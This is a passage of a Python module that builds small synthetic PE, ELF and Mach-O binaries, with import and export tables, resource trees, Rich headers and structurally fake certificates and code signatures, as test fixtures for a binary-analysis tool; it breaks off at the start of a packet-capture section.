"""Tiny writers for binary test fixtures: PE and ELF images, pcap packets and
EVTX logs. Everything is synthetic and deterministic (no real programs, no real
people, documentation IP ranges only). The same builders generate
apps/data/sample.pcap and apps/data/sample.evtx.
"""

from __future__ import annotations

import struct
import zlib

# =============================================================================
# PE
# =============================================================================


def align(n: int, a: int) -> int:
    return (n + a - 1) // a * a


def build_pe(plus=True, sections=None, imports=None, exports=None, signed=False, timestamp=0x65A0_0000,
             dll=False, subsystem=3, dll_characteristics=0x8160, entry_section=".text", overlay=b"",
             rich=None, resources=None, signature=None):
    """A small but well-formed PE32/PE32+ image.

    sections: list of (name, data, characteristics) — default .text/.rdata/.data.
    imports: {"KERNEL32.dll": ["CreateFileW", ...]} built into .rdata (an .idata
    table is appended as its own section). exports: list of names (a .edata section).
    signed: add a fake security directory (no real signature).
    rich: [(product_id, build, count), ...] for a Rich header (with a correct checksum).
    resources: [(type_id, name_id_or_text, language, data), ...] built into a .rsrc section.
    signature: PKCS#7 bytes (see build_pkcs7) stored as a real WIN_CERTIFICATE.
    imports values may hold ints: imported by ordinal.
    """
    file_align, sect_align = 0x200, 0x1000
    if sections is None:
        sections = [
            (".text", b"\x55\x8b\xec" + b"\x90" * 200 + b"\xc3", 0x60000020),
            (".rdata", b"Hello from a test program\x00" + b"\x00" * 40, 0x40000040),
            (".data", b"\x00" * 64 + b"data" * 8, 0xC0000040),
        ]
    sections = list(sections)
    extra_builders = []
    if imports:
        extra_builders.append(("import", imports))
    if exports:
        extra_builders.append(("export", exports))
    if resources:
        extra_builders.append(("resource", resources))
    pe_off = 0x80 + (24 + 8 * len(rich) if rich else 0)
    opt_size = 240 if plus else 224
    n_sections = len(sections) + len(extra_builders)
    headers_size = align(pe_off + 24 + opt_size + 40 * n_sections, file_align)
    # Lay out sections.
    laid = []
    rva = sect_align
    raw = headers_size
    for name, data, chars in sections:
        laid.append({"name": name, "data": data, "chars": chars, "rva": rva, "raw": raw,
                     "vsize": max(len(data), 1), "rsize": align(len(data), file_align)})
        rva = align(rva + max(len(data), 1), sect_align)
        raw += align(len(data), file_align)
    directories = {}
    for kind, spec in extra_builders:
        if kind == "import":
            data = build_import_table(spec, rva, plus)
            laid.append({"name": ".idata", "data": data, "chars": 0xC0000040, "rva": rva, "raw": raw,
                         "vsize": len(data), "rsize": align(len(data), file_align)})
            directories["import"] = (rva, len(data))
        elif kind == "resource":
            data = build_resource_table(spec, rva)
            laid.append({"name": ".rsrc", "data": data, "chars": 0x40000040, "rva": rva, "raw": raw,
                         "vsize": len(data), "rsize": align(len(data), file_align)})
            directories["resource"] = (rva, len(data))
        else:
            data = build_export_table(spec, rva)
            laid.append({"name": ".edata", "data": data, "chars": 0x40000040, "rva": rva, "raw": raw,
                         "vsize": len(data), "rsize": align(len(data), file_align)})
            directories["export"] = (rva, len(data))
        rva = align(rva + len(data), sect_align)
        raw += align(len(data), file_align)
    image_size = rva
    entry = next((s for s in laid if s["name"] == entry_section), laid[0])
    entry_point = entry["rva"] + 0 if entry_section else 0
    if entry_section is None:
        entry_point = image_size + 0x100  # outside every section
    cert_blob = b""
    if signature is not None:
        cert_blob = struct.pack("<IHH", 8 + len(signature), 0x0200, 0x0002) + signature
        cert_blob += b"\x00" * (align(len(cert_blob), 8) - len(cert_blob))
        directories["security"] = (raw + len(overlay), len(cert_blob))
    elif signed:
        directories["security"] = (raw + len(overlay), 0x800)

    # DOS header + stub (+ Rich header).
    dos = bytearray(0x80)
    dos[:2] = b"MZ"
    struct.pack_into("<H", dos, 0x18, 0x40)
    struct.pack_into("<I", dos, 0x3C, pe_off)
    dos[0x40:0x40 + 14] = b"This program cannot be run in DOS mode.\r\n$"[:14]
    if rich:
        dos += build_rich_header(bytes(dos), rich)
    characteristics = 0x0002 | (0x2000 if dll else 0) | (0x0020 if plus else 0x0100)
    coff = struct.pack("<HHIIIHH", 0x8664 if plus else 0x14C, n_sections, timestamp, 0, 0, opt_size, characteristics)
    code = next((s for s in laid if s["chars"] & 0x20), laid[0])
    opt = struct.pack("<HBBIIIII", 0x20B if plus else 0x10B, 14, 29, code["rsize"], 0x400, 0, entry_point, code["rva"])
    if plus:
        opt += struct.pack("<Q", 0x140000000)
    else:
        opt += struct.pack("<II", laid[-1]["rva"], 0x400000)
    opt += struct.pack("<IIHHHHHHIIIIHH", sect_align, file_align, 6, 0, 0, 0, 6, 0, 0, image_size, headers_size, 0,
                       subsystem, dll_characteristics)
    if plus:
        opt += struct.pack("<QQQQ", 0x100000, 0x1000, 0x100000, 0x1000)
    else:
        opt += struct.pack("<IIII", 0x100000, 0x1000, 0x100000, 0x1000)
    opt += struct.pack("<II", 0, 16)
    names = ["export", "import", "resource", "exception", "security", "basereloc", "debug", "architecture",
             "globalptr", "tls", "load_config", "bound_import", "iat", "delay_import", "clr", "reserved"]
    for name in names:
        opt += struct.pack("<II", *directories.get(name, (0, 0)))
    assert len(opt) == opt_size, len(opt)
    table = b""
    for s in laid:
        table += struct.pack("<8sIIIIIIHHI", s["name"].encode("latin-1")[:8].ljust(8, b"\x00"), s["vsize"], s["rva"],
                             s["rsize"], s["raw"], 0, 0, 0, 0, s["chars"])
    image = bytearray(dos + b"PE\x00\x00" + coff + opt + table)
    image += b"\x00" * (headers_size - len(image))
    for s in laid:
        assert len(image) == s["raw"]
        image += s["data"] + b"\x00" * (s["rsize"] - len(s["data"]))
    image += overlay
    if signature is not None:
        image += cert_blob
    elif signed:
        image += b"\x00\x08\x00\x00\x00\x02\x02\x00" + b"\x30\x82" + b"\x00" * 0x7F6
    return bytes(image)


def build_import_table(imports: dict, base_rva: int, plus: bool) -> bytes:
    """An import directory with lookup tables, hint/name entries and DLL names."""
    dlls = list(imports.items())
    desc_size = 20 * (len(dlls) + 1)
    thunk_size = 8 if plus else 4
    # Layout: descriptors | thunks (ILT then IAT per dll) | hint/names | dll names
    pos = desc_size
    thunk_offsets = []
    for dll, names in dlls:
        ilt = pos
        pos += thunk_size * (len(names) + 1)
        iat = pos
        pos += thunk_size * (len(names) + 1)
        thunk_offsets.append((ilt, iat))
    name_blob = bytearray()
    hint_offsets = []
    for dll, names in dlls:
        offs = []
        for name in names:
            if isinstance(name, int):
                offs.append(("ordinal", name))
                continue
            if len(name_blob) % 2:
                name_blob += b"\x00"
            offs.append(pos + len(name_blob))
            name_blob += b"\x00\x00" + name.encode("latin-1") + b"\x00"
        hint_offsets.append(offs)
    dll_name_offsets = []
    for dll, _ in dlls:
        dll_name_offsets.append(pos + len(name_blob))
        name_blob += dll.encode("latin-1") + b"\x00"
    out = bytearray()
    for i, (dll, names) in enumerate(dlls):
        ilt, iat = thunk_offsets[i]
        out += struct.pack("<IIIII", base_rva + ilt, 0, 0, base_rva + dll_name_offsets[i], base_rva + iat)
    out += b"\x00" * 20
    for i, (dll, names) in enumerate(dlls):
        for _ in range(2):
            for off in hint_offsets[i]:
                if isinstance(off, tuple):  # by ordinal
                    out += struct.pack("<Q" if plus else "<I", (1 << (63 if plus else 31)) | off[1])
                else:
                    out += struct.pack("<Q" if plus else "<I", base_rva + off)
            out += b"\x00" * thunk_size
    assert len(out) == pos
    out += name_blob
    return bytes(out)


def build_export_table(names: list, base_rva: int, dll_name="test.dll") -> bytes:
    n = len(names)
    header = 40
    funcs = header
    name_ptrs = funcs + 4 * n
    ordinals = name_ptrs + 4 * n
    strings = ordinals + 2 * n
    blob = bytearray()
    string_rvas = []
    for name in names:
        string_rvas.append(base_rva + strings + len(blob))
        blob += name.encode("latin-1") + b"\x00"
    dll_rva = base_rva + strings + len(blob)
    blob += dll_name.encode("latin-1") + b"\x00"
    out = struct.pack("<IIHHIIIIIII", 0, 0x65A00000, 0, 0, dll_rva, 1, n, n, base_rva + funcs, base_rva + name_ptrs,
                      base_rva + ordinals)
    for i in range(n):
        out += struct.pack("<I", 0x1000 + 0x10 * i)
    for r in string_rvas:
        out += struct.pack("<I", r)
    for i in range(n):
        out += struct.pack("<H", i)
    return out + bytes(blob)


def _rol32(value: int, n: int) -> int:
    n %= 32
    return ((value << n) | (value >> (32 - n))) & 0xFFFFFFFF


def build_rich_header(dos: bytes, entries) -> bytes:
    """The Rich header MSVC's linker writes after the DOS stub, XOR-ed with its checksum."""
    start = len(dos)
    key = start
    for i, b in enumerate(dos):
        if 0x3C <= i < 0x40:
            continue
        key += _rol32(b, i)
    comp_ids = [((prod << 16) | build, count) for prod, build, count in entries]
    for comp, count in comp_ids:
        key += _rol32(comp, count)
    key &= 0xFFFFFFFF
    clear = [0x536E6144, 0, 0, 0] + [v for pair in comp_ids for v in pair]
    return b"".join(struct.pack("<I", v ^ key) for v in clear) + b"Rich" + struct.pack("<I", key)


def build_resource_table(entries, base_rva: int) -> bytes:
    """A three-level resource tree (type / name / language) with data entries."""
    tree: dict = {}
    for type_id, name, lang, data in entries:
        tree.setdefault(type_id, {}).setdefault(name, []).append((lang, data))
    dirs = []  # (key, children) in layout order: root, then type dirs, then name dirs

    def dir_size(n):
        return 16 + 8 * n
    offsets = {}
    pos = dir_size(len(tree))
    for t, names in tree.items():
        offsets[("t", t)] = pos
        pos += dir_size(len(names))
    for t, names in tree.items():
        for name, langs in names.items():
            offsets[("n", t, name)] = pos
            pos += dir_size(len(langs))
    for t, names in tree.items():
        for name, langs in names.items():
            for lang, _ in langs:
                offsets[("d", t, name, lang)] = pos
                pos += 16
    strings = bytearray()
    for t, names in tree.items():
        for name in names:
            if isinstance(name, str):
                offsets[("s", name)] = pos + len(strings)
                strings += struct.pack("<H", len(name)) + name.encode("utf-16-le")
    pos += len(strings)
    blobs = bytearray()
    for t, names in tree.items():
        for name, langs in names.items():
            for lang, data in langs:
                pos = align(pos, 4)
                offsets[("b", t, name, lang)] = pos + len(blobs)
                blobs += data
    out = bytearray()

    def directory(children):
        out.extend(struct.pack("<IIHHHH", 0, 0, 4, 0, 0, len(children)))
        for ident, target in children:
            out.extend(struct.pack("<II", ident, target))

    def ident_of(name):
        return 0x80000000 | offsets[("s", name)] if isinstance(name, str) else name
    directory([(t, 0x80000000 | offsets[("t", t)]) for t in tree])
    for t, names in tree.items():
        directory([(ident_of(name), 0x80000000 | offsets[("n", t, name)]) for name in names])
    for t, names in tree.items():
        for name, langs in names.items():
            directory([(lang, offsets[("d", t, name, lang)]) for lang, _ in langs])
    for t, names in tree.items():
        for name, langs in names.items():
            for lang, data in langs:
                out.extend(struct.pack("<IIII", base_rva + offsets[("b", t, name, lang)], len(data), 1252, 0))
    out += strings
    out += b"\x00" * (align(len(out), 4) - len(out))
    out += blobs
    return bytes(out)


# -- DER, X.509 and PKCS#7 (structure only: the signatures are not real) ------

def der(tag: int, content: bytes) -> bytes:
    n = len(content)
    if n < 0x80:
        length = bytes([n])
    else:
        raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
        length = bytes([0x80 | len(raw)]) + raw
    return bytes([tag]) + length + content


def der_oid(dotted: str) -> bytes:
    parts = [int(p) for p in dotted.split(".")]
    body = bytearray([40 * parts[0] + parts[1]])
    for p in parts[2:]:
        chunk = [p & 0x7F]
        p >>= 7
        while p:
            chunk.append(0x80 | (p & 0x7F))
            p >>= 7
        body += bytes(reversed(chunk))
    return der(0x06, bytes(body))


def der_int(n: int) -> bytes:
    raw = n.to_bytes(max(1, (n.bit_length() + 8) // 8), "big")
    return der(0x02, raw)


def der_seq(*items) -> bytes:
    return der(0x30, b"".join(items))


def der_set(*items) -> bytes:
    return der(0x31, b"".join(items))


NAME_OIDS = {"CN": "2.5.4.3", "C": "2.5.4.6", "L": "2.5.4.7", "ST": "2.5.4.8", "O": "2.5.4.10", "OU": "2.5.4.11"}


def der_name(pairs) -> bytes:
    return der_seq(*[der_set(der_seq(der_oid(NAME_OIDS[k]), der(0x0C, v.encode()))) for k, v in pairs])


def build_cert(subject, issuer, serial, not_before="240101000000Z", not_after="270101000000Z") -> bytes:
    sha256_rsa = der_seq(der_oid("1.2.840.113549.1.1.11"), der(0x05, b""))
    tbs = der_seq(der(0xA0, der_int(2)), der_int(serial), sha256_rsa, der_name(issuer),
                  der_seq(der(0x17, not_before.encode()), der(0x17, not_after.encode())), der_name(subject),
                  der_seq(der_seq(der_oid("1.2.840.113549.1.1.1"), der(0x05, b"")), der(0x03, b"\x00" + b"\x01" * 16)))
    return der_seq(tbs, sha256_rsa, der(0x03, b"\x00" + b"\x02" * 32))


def build_pkcs7(certs, signer, digest="2.16.840.1.101.3.4.2.1") -> bytes:
    """Authenticode-shaped SignedData. certs: DER certificates; signer: (issuer pairs, serial)."""
    alg = der_seq(der_oid(digest), der(0x05, b""))
    content = der_seq(der_oid("1.3.6.1.4.1.311.2.1.4"), der(0xA0, der_seq(b"")))
    signer_info = der_seq(der_int(1), der_seq(der_name(signer[0]), der_int(signer[1])), alg,
                          der_seq(der_oid("1.2.840.113549.1.1.1"), der(0x05, b"")), der(0x04, b"\x03" * 32))
    signed = der_seq(der_int(1), der_set(alg), content, der(0xA0, b"".join(certs)), der_set(signer_info))
    return der_seq(der_oid("1.2.840.113549.1.7.2"), der(0xA0, signed))


# =============================================================================
# ELF
# =============================================================================


def build_elf(bits=64, e_type=2, machine=62, sections=None, needed=("libc.so.6",), imports=("puts", "socket"),
              exports=(), interp="/lib64/ld-linux-x86-64.so.2", wx_segment=False, symtab=True, entry_section=".text",
              little=True, no_section_headers=False, versions=None, relro=None):
    """A small, well-formed ELF image with .text/.rodata/.data, .interp, .dynstr/.dynsym/.dynamic
    (so DT_NEEDED and imports are real), .symtab (unless stripped) and .shstrtab.
    versions: {"puts": ("libc.so.6", "GLIBC_2.2.5")} adds .gnu.version/.gnu.version_r.
    relro: "partial" adds a GNU_RELRO segment; "full" also asks for BIND_NOW."""
    e = "<" if little else ">"
    is64 = bits == 64
    base = 0x400000
    ehsize = 64 if is64 else 52
    phentsize = 56 if is64 else 32
    shentsize = 64 if is64 else 40
    if sections is None:
        sections = [
            (".text", b"\x55\x48\x89\xe5" + b"\x90" * 120 + b"\xc3", 1, 0x6),
            (".rodata", b"Hello from a test ELF\x00" + b"\x00" * 10, 1, 0x2),
            (".data", b"\x01\x02\x03\x04" * 16, 1, 0x3),
        ]
    # Build string tables.
    dynstr = bytearray(b"\x00")

    def dyn_name(text):
        off = len(dynstr)
        dynstr.extend(text.encode() + b"\x00")
        return off

    needed_offs = [dyn_name(n) for n in needed]
    import_offs = [dyn_name(n) for n in imports]
    export_offs = [dyn_name(n) for n in exports]
    sym_size = 24 if is64 else 16

    def sym(name_off, value, size, info, shndx):
        if is64:
            return struct.pack(e + "IBBHQQ", name_off, info, 0, shndx, value, size)
        return struct.pack(e + "IIIBBH", name_off, value, size, info, 0, shndx)

    dynsym = bytearray(sym(0, 0, 0, 0, 0))
    for off in import_offs:
        dynsym += sym(off, 0, 0, (1 << 4) | 2, 0)
    text_index = 4  # section index of .text (after null, .interp, .dynstr, .dynsym? computed below)
    extra = [(".interp", interp.encode() + b"\x00", 1, 0x2)] if interp else []
    # Final section order: null, [.interp], user sections..., .dynstr, .dynsym, .dynamic, [.symtab, .strtab], .shstrtab
    ordered = extra + list(sections)
    text_shndx = 1 + next(i for i, s in enumerate(ordered) if s[0] == ".text")
    for off in export_offs:
        dynsym += sym(off, base + 0x1000, 16, (1 << 4) | 2, text_shndx)
    dyn_entries = [(1, off) for off in needed_offs]
    if relro == "full":
        dyn_entries += [(30, 0x8), (0x6FFFFFFB, 0x1)]
    version_sections = []
    if versions:
        libs: dict = {}
        for name in imports:
            if name in versions:
                lib, ver = versions[name]
                libs.setdefault(lib, [])
                if ver not in libs[lib]:
                    libs[lib].append(ver)
        index = {}
        verneed = bytearray()
        next_index = 2
        lib_items = list(libs.items())
        for li, (lib, vers) in enumerate(lib_items):
            file_off = dyn_name(lib)
            size = 16 + 16 * len(vers)
            verneed += struct.pack(e + "HHIII", 1, len(vers), file_off, 16, size if li + 1 < len(lib_items) else 0)
            for vi, ver in enumerate(vers):
                index[(lib, ver)] = next_index
                h = 0
                for ch in ver.encode():
                    h = ((h << 4) + ch) & 0xFFFFFFFF
                    g = h & 0xF0000000
                    if g:
                        h ^= g >> 24
                    h &= ~g & 0xFFFFFFFF
                verneed += struct.pack(e + "IHHII", h, 0, next_index, dyn_name(ver), 16 if vi + 1 < len(vers) else 0)
                next_index += 1
        versym = struct.pack(e + "H", 0)
        for name in imports:
            versym += struct.pack(e + "H", index[versions[name]] if name in versions else 1)
        versym += struct.pack(e + "H", 1) * len(exports)
        version_sections = [(".gnu.version", versym, 0x6FFFFFFF, 0x2), (".gnu.version_r", bytes(verneed), 0x6FFFFFFE, 0x2)]
        version_need_count = len(lib_items)
    # placeholders for strtab/symtab addresses filled after layout
    ordered.append((".dynstr", bytes(dynstr), 3, 0x2))
    ordered.append((".dynsym", bytes(dynsym), 11, 0x2))
    ordered.extend(version_sections)
    ordered.append((".dynamic", None, 6, 0x3))
    strtab = bytearray(b"\x00")
    symtab_data = bytearray(sym(0, 0, 0, 0, 0))
    if symtab:
        for name in ("main", "_start", "helper"):
            off = len(strtab)
            strtab += name.encode() + b"\x00"
            symtab_data += sym(off, base + 0x1000, 8, (1 << 4) | 2, text_shndx)
        ordered.append((".symtab", bytes(symtab_data), 2, 0))
        ordered.append((".strtab", bytes(strtab), 3, 0))
    shstr = bytearray(b"\x00")
    shname = {}
    for name, *_ in ordered + [(".shstrtab",)]:
        shname[name] = len(shstr)
        shstr += name.encode() + b"\x00"
    ordered.append((".shstrtab", bytes(shstr), 3, 0))

    # Layout: headers, then one LOAD segment covering everything (RX, or RWX if wx_segment)
    n_ph = 2 + (1 if interp else 0) + 1 + (1 if relro else 0)  # LOAD, DYNAMIC, [INTERP], GNU_STACK, [GNU_RELRO]
    off = ehsize + phentsize * n_ph
    laid = []
    for name, data, s_type, flags in ordered:
        off = align(off, 16)
        size = len(data) if data is not None else (16 if is64 else 8) * (len(dyn_entries) + 5)
        laid.append({"name": name, "data": data, "type": s_type, "flags": flags, "offset": off, "size": size,
                     "addr": base + off if flags & 0x2 else 0})
        off += size
    by_name = {s["name"]: s for s in laid}
    # Fill .dynamic now that addresses are known.
    dyn = bytearray()
    entries = dyn_entries + [(5, by_name[".dynstr"]["addr"]), (6, by_name[".dynsym"]["addr"]),
                             (10, len(dynstr)), (11, sym_size), (0, 0)]
    for tag, value in entries:
        dyn += struct.pack(e + ("qQ" if is64 else "iI"), tag, value)
    by_name[".dynamic"]["data"] = bytes(dyn)
    by_name[".dynamic"]["size"] = len(dyn)
    shoff = align(off, 8)
    total = shoff + shentsize * (len(laid) + 1)
    if no_section_headers:
        shoff = 0
    entry_sec = by_name.get(entry_section)
    entry = entry_sec["addr"] if entry_sec else base + total + 0x1000
    # Headers
    ident = b"\x7fELF" + bytes([2 if is64 else 1, 1 if little else 2, 1, 0]) + b"\x00" * 8
    if is64:
        ehdr = ident + struct.pack(e + "HHIQQQIHHHHHH", e_type, machine, 1, entry, ehsize, shoff, 0, ehsize, phentsize,
                                   n_ph, shentsize, 0 if no_section_headers else len(laid) + 1,
                                   0 if no_section_headers else len(laid))
    else:
        ehdr = ident + struct.pack(e + "HHIIIIIHHHHHH", e_type, machine, 1, entry, ehsize, shoff, 0, ehsize, phentsize,
                                   n_ph, shentsize, 0 if no_section_headers else len(laid) + 1,
                                   0 if no_section_headers else len(laid))
    load_flags = 0x7 if wx_segment else 0x5

    def phdr(p_type, p_flags, offset, vaddr, filesz, memsz, align_):
        if is64:
            return struct.pack(e + "IIQQQQQQ", p_type, p_flags, offset, vaddr, vaddr, filesz, memsz, align_)
        return struct.pack(e + "IIIIIIII", p_type, offset, vaddr, vaddr, filesz, memsz, p_flags, align_)

    phdrs = phdr(1, load_flags, 0, base, total, total, 0x1000)
    if interp:
        s = by_name[".interp"]
        phdrs += phdr(3, 0x4, s["offset"], s["addr"], s["size"], s["size"], 1)
    s = by_name[".dynamic"]
    phdrs += phdr(2, 0x6, s["offset"], s["addr"], s["size"], s["size"], 8)
    phdrs += phdr(0x6474E551, 0x6, 0, 0, 0, 0, 16)
    if relro:
        phdrs += phdr(0x6474E552, 0x4, s["offset"], s["addr"], s["size"], s["size"], 1)
    image = bytearray(ehdr + phdrs)
    for s in laid:
        image += b"\x00" * (s["offset"] - len(image))
        image += s["data"]
    if not no_section_headers:
        image += b"\x00" * (shoff - len(image))
        image += b"\x00" * shentsize  # null section
        for s in laid:
            link = 0
            if s["name"] == ".dynsym":
                link = 1 + laid.index(by_name[".dynstr"])
            if s["name"] == ".symtab":
                link = 1 + laid.index(by_name[".strtab"])
            if s["name"] in (".dynamic", ".gnu.version_r"):
                link = 1 + laid.index(by_name[".dynstr"])
            if s["name"] == ".gnu.version":
                link = 1 + laid.index(by_name[".dynsym"])
            info = version_need_count if s["name"] == ".gnu.version_r" else 0
            entsize = sym_size if s["name"] in (".dynsym", ".symtab") else (16 if is64 else 8) if s["name"] == ".dynamic" else 0
            if is64:
                image += struct.pack(e + "IIQQQQIIQQ", shname[s["name"]], s["type"], s["flags"], s["addr"], s["offset"],
                                     s["size"], link, info, 16, entsize)
            else:
                image += struct.pack(e + "IIIIIIIIII", shname[s["name"]], s["type"], s["flags"], s["addr"], s["offset"],
                                     s["size"], link, info, 16, entsize)
        # The section name table index was set to len(laid) (.shstrtab is last).
    return bytes(image)


# =============================================================================
# Mach-O
# =============================================================================

MACHO_CPUS = {"x64": (0x01000007, 3), "arm64": (0x0100000C, 0), "arm64e": (0x0100000C, 2), "x86": (7, 3),
              "arm": (12, 9), "powerpc": (18, 0)}


def build_code_signature(identifier, adhoc=True, team=None, entitlements=None, cms=b"", runtime=False) -> bytes:
    """A SuperBlob with a CodeDirectory (fake hashes), optional entitlements and a CMS wrapper (big-endian)."""
    ident = identifier.encode() + b"\x00"
    team_b = team.encode() + b"\x00" if team else b""
    header = 88
    hash_off = header + len(ident) + len(team_b)
    flags = (0x2 if adhoc else 0) | (0x10000 if runtime else 0)
    cd = struct.pack(">IIIIIIIII", 0xFADE0C02, hash_off + 32, 0x20400, flags, hash_off, header, 0, 1, 0x1000)
    cd += struct.pack(">BBBBIIIIQQQQ", 32, 2, 0, 12, 0, 0, header + len(ident) if team else 0, 0, 0, 0, 0, 0)
    assert len(cd) == header
    cd += ident + team_b + b"\x11" * 32
    blobs = [(0, cd)]
    if entitlements:
        text = entitlements.encode()
        blobs.append((5, struct.pack(">II", 0xFADE7171, 8 + len(text)) + text))
    blobs.append((0x10000, struct.pack(">II", 0xFADE0B01, 8 + len(cms)) + cms))
    pos = 12 + 8 * len(blobs)
    index, body = b"", b""
    for kind, blob in blobs:
        index += struct.pack(">II", kind, pos + len(body))
        body += blob
    return struct.pack(">III", 0xFADE0CC0, 12 + len(index) + len(body), len(blobs)) + index + body


def build_macho(bits=64, cpu="arm64", filetype=2, pie=True, dylibs=("/usr/lib/libSystem.B.dylib",),
                imports=("_printf", "_socket"), exports=("_main",), text=None, cstring=b"Hello from a test Mach-O\x00",
                signature="adhoc", identifier="com.example.demo", team=None, entitlements=None, cms=b"",
                encrypted=False, stack_exec=False, wx=False, rpaths=(), little=True, extra_sections=(), page=0x4000):
    """A small, well-formed Mach-O: __PAGEZERO, __TEXT (__text, __cstring), __DATA, __LINKEDIT with a
    symbol table and (unless signature is None) a code signature. extra_sections: [(name, data)] in __DATA."""
    e = "<" if little else ">"
    is64 = bits == 64
    cputype, subtype = MACHO_CPUS[cpu]
    text = text if text is not None else b"\xfd\x7b\xbf\xa9" + b"\x1f\x20\x03\xd5" * 30 + b"\xc0\x03\x5f\xd6"
    seg_cmd, seg_size, sect_size = (0x19, 72, 80) if is64 else (0x1, 56, 68)
    base = 0x100000000 if is64 and filetype == 2 else 0

    def cstr_cmd(cmd, fixed: bytes, text_: str) -> bytes:
        raw = text_.encode() + b"\x00"
        size = align(8 + len(fixed) + 4 + len(raw), 8)
        return (struct.pack(e + "III", cmd, size, 8 + len(fixed) + 4) + fixed + raw).ljust(size, b"\x00")

    def section(name, seg, addr, size, offset, flags=0):
        n, s = name.encode().ljust(16, b"\x00"), seg.encode().ljust(16, b"\x00")
        if is64:
            return struct.pack(e + "16s16sQQIIIIIIII", n, s, addr, size, offset, 2, 0, 0, flags, 0, 0, 0)
        return struct.pack(e + "16s16sIIIIIIIII", n, s, addr, size, offset, 2, 0, 0, flags, 0, 0)

    def segment(name, vmaddr, vmsize, fileoff, filesize, maxprot, initprot, sections=()):
        n = name.encode().ljust(16, b"\x00")
        size = seg_size + sect_size * len(sections)
        if is64:
            head = struct.pack(e + "II16sQQQQiiII", seg_cmd, size, n, vmaddr, vmsize, fileoff, filesize, maxprot,
                               initprot, len(sections), 0)
        else:
            head = struct.pack(e + "II16sIIIIiiII", seg_cmd, size, n, vmaddr, vmsize, fileoff, filesize, maxprot,
                               initprot, len(sections), 0)
        return head + b"".join(sections)

    # Symbols and strings.
    strtab = bytearray(b"\x00")
    syms = []
    for name in exports:
        syms.append((len(strtab), 0x0F, 1, 0, base + page))
        strtab += name.encode() + b"\x00"
    for name in imports:
        syms.append((len(strtab), 0x01, 0, 0x0100, 0))
        strtab += name.encode() + b"\x00"
    symtab = b"".join(struct.pack(e + ("IBBHQ" if is64 else "IBBHI"), *s) for s in syms)
    strtab += b"\x00" * (align(len(strtab), 8) - len(strtab))

    def commands(text_off, data_off, link_off, sig_off, sig_size, data_blob):
        cmds = []
        if filetype == 2:
            cmds.append(segment("__PAGEZERO", 0, base or 0x1000, 0, 0, 0, 0))
        text_size = text_off + len(text) + len(cstring)
        rx = 7 if wx else 5
        cmds.append(segment("__TEXT", base, align(text_size, page), 0, align(text_size, page), rx, rx, [
            section("__text", "__TEXT", base + text_off, len(text), text_off, 0x80000400),
            section("__cstring", "__TEXT", base + text_off + len(text), len(cstring), text_off + len(text), 2)]))
        data_secs, pos = [], data_off
        for name, blob in [("__data", b"\x01\x02\x03\x04" * 8)] + list(extra_sections):
            data_secs.append(section(name, "__DATA", base + pos, len(blob), pos))
            pos += len(blob)
        cmds.append(segment("__DATA", base + data_off, align(len(data_blob), page) or page, data_off,
                            align(len(data_blob), page), 3, 3, data_secs))
        link_size = sig_off + sig_size - link_off if sig_size else len(symtab) + len(strtab)
        cmds.append(segment("__LINKEDIT", base + link_off, align(link_size, page), link_off, link_size, 1, 1))
        versions = struct.pack(e + "III", 2, 0x10000, 0x10000)
        if filetype == 6:
            cmds.append(cstr_cmd(0xD, versions, "@rpath/libdemo.dylib"))
        else:
            cmds.append(cstr_cmd(0xE, b"", "/usr/lib/dyld"))
        cmds.append(struct.pack(e + "II", 0x1B, 24) + bytes(range(16)))
        cmds.append(struct.pack(e + "IIIIII", 0x32, 24, 1, 0x000D0000, 0x000E0000, 0))
        if filetype == 2:
            cmds.append(struct.pack(e + "IIQQ", 0x80000028, 24, text_off, 0))
        for lib in dylibs:  # a path, or (load command, path) for weak/re-exported libraries
            kind, path = lib if isinstance(lib, tuple) else (0xC, lib)
            cmds.append(cstr_cmd(kind, versions, path))
        for path in rpaths:
            cmds.append(cstr_cmd(0x8000001C, b"", path))
        cmds.append(struct.pack(e + "IIIIII", 0x2, 24, link_off, len(syms), link_off + len(symtab), len(strtab)))
        if encrypted:
            cmds.append(struct.pack(e + "IIIII", 0x2C if is64 else 0x21, 24 if is64 else 20, text_off, len(text), 1)
                        + (b"\x00" * 4 if is64 else b""))
        if sig_size:
            cmds.append(struct.pack(e + "IIII", 0x1D, 16, sig_off, sig_size))
        return cmds

    sig = b""
    if signature is not None:
        sig = build_code_signature(identifier, adhoc=signature == "adhoc", team=team, entitlements=entitlements, cms=cms)
    data_blob = b"\x01\x02\x03\x04" * 8 + b"".join(blob for _, blob in extra_sections)
    header_size = 32 if is64 else 28
    probe = commands(0, 0, 0, 0, len(sig), data_blob)
    cmds_size = sum(len(c) for c in probe)
    text_off = align(header_size + cmds_size, 16)
    data_off = align(text_off + len(text) + len(cstring), page)
    link_off = align(data_off + len(data_blob), page)
    sig_off = align(link_off + len(symtab) + len(strtab), 16)
    cmds = commands(text_off, data_off, link_off, sig_off, len(sig), data_blob)
    flags = 0x1 | 0x4 | 0x80 | (0x200000 if pie and filetype == 2 else 0) | (0x20000 if stack_exec else 0)
    head = struct.pack(e + "IiiIIII", 0xFEEDFACF if is64 else 0xFEEDFACE, cputype, subtype, filetype, len(cmds),
                       sum(len(c) for c in cmds), flags) + (b"\x00" * 4 if is64 else b"")
    image = bytearray(head + b"".join(cmds))
    image += b"\x00" * (text_off - len(image)) + text + cstring
    image += b"\x00" * (data_off - len(image)) + data_blob
    image += b"\x00" * (link_off - len(image)) + symtab + strtab
    if sig:
        image += b"\x00" * (sig_off - len(image)) + sig
    return bytes(image)


def build_fat(slices, fat64=False) -> bytes:
    """A universal binary holding the given thin Mach-O images (big-endian fat header)."""
    out_head = struct.pack(">II", 0xCAFEBABF if fat64 else 0xCAFEBABE, len(slices))
    entry = 32 if fat64 else 20
    pos = align(8 + entry * len(slices), 0x4000)
    table, body = b"", b""
    for data in slices:
        e = "<" if data[:4] in (b"\xcf\xfa\xed\xfe", b"\xce\xfa\xed\xfe") else ">"
        cputype, subtype = struct.unpack_from(e + "ii", data, 4)
        offset = pos + len(body)
        if fat64:
            table += struct.pack(">iiQQII", cputype, subtype, offset, len(data), 14, 0)
        else:
            table += struct.pack(">iiIII", cputype, subtype, offset, len(data), 14)
        body += data + b"\x00" * (align(len(data), 0x4000) - len(data))
    head = out_head + table
    return head + b"\x00" * (pos - len(head)) + body


# =============================================================================
# Packets and captures
# =============================================================================

import datetime as _dt  # noqa: E402

T0 = _dt.datetime(2026, 3, 12, 9, 14, 5, tzinfo=_dt.timezone.utc).timestamp()

MAC_WS = bytes.fromhex("0a1b2c3d4e01")        # workstation 192.0.2.10
